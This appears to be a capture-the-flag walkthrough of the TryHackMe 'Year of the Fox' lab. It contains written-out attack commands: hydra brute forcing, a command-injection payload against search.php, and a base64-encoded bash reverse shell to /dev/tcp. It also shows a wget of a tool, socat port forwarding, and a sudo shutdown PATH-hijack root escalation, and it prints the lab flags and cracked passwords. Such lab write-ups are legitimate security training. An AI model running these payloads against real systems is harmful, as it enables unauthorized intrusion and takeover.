CTF URL: https://tryhackme.com/r/room/yotf
# IP
```
10.10.240.251
```
# Reconaisance
## NMAP
```bash
sudo nmap -sS -p- -T4 10.10.240.251 -v
80,139,445

nmap -sS -sC -sV 10.10.240.251 -v
80/tcp  open  http        Apache httpd 2.4.29
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=You want in? Gotta guess the password!
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 401 Unauthorized
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: YEAROFTHEFOX)
Service Info: Hosts: year-of-the-fox.lan, YEAR-OF-THE-FOX

Host script results:
| nbstat: NetBIOS name: YEAR-OF-THE-FOX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   YEAR-OF-THE-FOX<00>  Flags: <unique><active>
|   YEAR-OF-THE-FOX<03>  Flags: <unique><active>
|   YEAR-OF-THE-FOX<20>  Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   YEAROFTHEFOX<00>     Flags: <group><active>
|   YEAROFTHEFOX<1d>     Flags: <unique><active>
|_  YEAROFTHEFOX<1e>     Flags: <group><active>
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-03-24T11:49:38
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: year-of-the-fox
|   NetBIOS computer name: YEAR-OF-THE-FOX\x00
|   Domain name: lan
|   FQDN: year-of-the-fox.lan
|_  System time: 2024-03-24T11:49:38+00:00

```

## SMB
```bash
smbclient -L 10.10.240.251 -N         
        Sharename       Type      Comment
        ---------       ----      -------
        yotf            Disk      Foxs Stuff -- keep out!
        IPC$            IPC       IPC Service (year-of-the-fox server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        YEAROFTHEFOX         YEAR-OF-THE-FOX
```

```bash
smbmap -H 10.10.240.251  
[+] IP: 10.10.240.251:445       Name: 10.10.240.251             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        yotf                                                    NO ACCESS       Foxs Stuff -- keep out!
        IPC$                                                    NO ACCESS       IPC Service (year-of-the-fox server (Samba, Ubuntu))
```

```bash
enum4linux -a 10.10.240.251
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: fox      Name: fox       Desc:
user:[fox] rid:[0x3e8]

[+] Enumerating users using SID S-1-22-1 and logon username '', password '' 
S-1-22-1-1000 Unix User\fox (Local User)            
S-1-22-1-1001 Unix User\rascal (Local User)
```
`fox` user and `rascal` users are present
## WEB
port 80 is open and wants credentials. basic auth.
### Brute Force
user.txt consists of those two users.
```bash
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt -f 10.10.240.251 http-head / -t 64
[80][http-head] host: 10.10.240.251   login: rascal   password: candida
```
`rascal:candida`
### Rascal
input place that returns some files
```bash
curl 'http://10.10.240.251/assets/php/search.php' -X POST -H 'Authorization: Basic cmFzY2FsOmNhbmRpZGE=' --data-raw '{"target":""}'  
["creds2.txt","fox.txt","important-data.txt"]   
```
it is vulnerable to command injection
```bash
curl 'http://10.10.240.251/assets/php/search.php' -X POST -H 'Authorization: Basic cmFzY2FsOmNhbmRpZGE=' --data-raw '{"target":"\" \ncat /etc/passwd\n"}'
["sshd:x:110:65534::\/run\/sshd:\/usr\/sbin\/nologin"]   
```
and that is vulnerable script:
```php
<?php
if($_SERVER["REQUEST_METHOD"] != "POST"){
	echo "Uh oh, something went wrong!";
} else {
	$target = json_decode(file_get_contents("php://input"));
	if (strpos($target->target, "&") !== false || strpos($target->target, "$") !==false){
		echo json_encode(["Invalid Character"]);
		exit();
	}
	$query = exec("find ../../../files/* -iname \"*$target->target*\" | xargs");
	if (strlen($query) < 1){
			echo json_encode(["No file returned"]);
	} else{
		$queryArr = explode(" ", $query);
		foreach($queryArr as $key => $tmp){
				$queryArr[$key] = str_replace("../../../files/", "", $tmp);
		}
		echo json_encode($queryArr);
	}
}
?>

```
# Reverse shell
```bash
echo 'bash -i >& /dev/tcp/10.8.97.245/4444 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44Ljk3LjI0NS80NDQ0IDA+JjEK

curl 'http://10.10.240.251/assets/php/search.php' -X POST -H 'Authorization: Basic cmFzY2FsOmNhbmRpZGE=' --data-raw '{"target":"\" \necho YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44Ljk3LjI0NS80NDQ0IDA+JjEK | base64 -d | bash\n"}'
```

```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.97.245] from (UNKNOWN) [10.10.240.251] 60070
bash: cannot set terminal process group (649): Inappropriate ioctl for device
bash: no job control in this shell
www-data@year-of-the-fox:/var/www/html/assets/php$ whoami; hostname; ls
whoami; hostname; ls
www-data
year-of-the-fox
search.php
www-data@year-of-the-fox:/var/www/html/assets/php$ 
```

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# ctrl+z
stty raw -echo; fg
```
# Web flag
```bash
www-data@year-of-the-fox:/var/www$ ls -la
total 20
drwxr-xr-x  4 root root 4096 May 31  2020 .
drwxr-xr-x 13 root root 4096 May 30  2020 ..
drwxr-xr-x  2 root root 4096 May 31  2020 files
drwxr-xr-x  3 root root 4096 May 31  2020 html
-rw-r--r--  1 root root   38 May 31  2020 web-flag.txt
www-data@year-of-the-fox:/var/www$ cat web-flag.txt 
THM{Nzg2ZWQwYWUwN2UwOTU3NDY5ZjVmYTYw}
```
# User flag
```bash
su fox # will not work
ss -tulpn # says that there is a hidden ssh service
# from /etc/ssh/sshd_config you can learn that only fox can login
ssh fox@127.0.0.1 # is not working either
```
redirecting the port is the way
```bash
# on kali
# download socat binary from internet
python3 -m http.server
# on victim machine
cd /tmp
wget http://10.8.97.245:8000/socat
chmod +x socat
./socat TCP-LISTEN:2222,fork TCP:127.0.0.1:22

# on kali 
hydra -l fox -P /usr/share/wordlists/rockyou.txt ssh://10.10.240.251:2222
```
`fox:babydoll`
```bash
fox@year-of-the-fox:~$ cat user-flag.txt 
THM{Njg3NWZhNDBjMmNlMzNkMGZmMDBhYjhk}
```
# Root flag
```bash
fox@year-of-the-fox:/home$ sudo -l
Matching Defaults entries for fox on year-of-the-fox:
    env_reset, mail_badpass

User fox may run the following commands on year-of-the-fox:
    (root) NOPASSWD: /usr/sbin/shutdown

```
https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-shutdown-poweroff-privilege-escalation/
```bash
echo /bin/bash > /tmp/poweroff
chmod +x /tmp/poweroff
export PATH=/tmp:$PATH
sudo /usr/sbin/shutdown
```

```bash
whoami
root

cat root.txt 
Not here -- go find!

find / -type f -iname '*root*' 2>/dev/null
/home/rascal/.did-you-think-I-was-useless.root

cat /home/rascal/.did-you-think-I-was-useless.root
T
H
M
{ODM3NTdk
MDljYmM4Z
jdhZWFhY2
VjY2Fk}

Here's the prize:

YTAyNzQ3ODZlMmE2MjcwNzg2NjZkNjQ2Nzc5NzA0NjY2Njc2NjY4M2I2OTMyMzIzNTNhNjk2ODMw
Mwo=

Good luck!

```

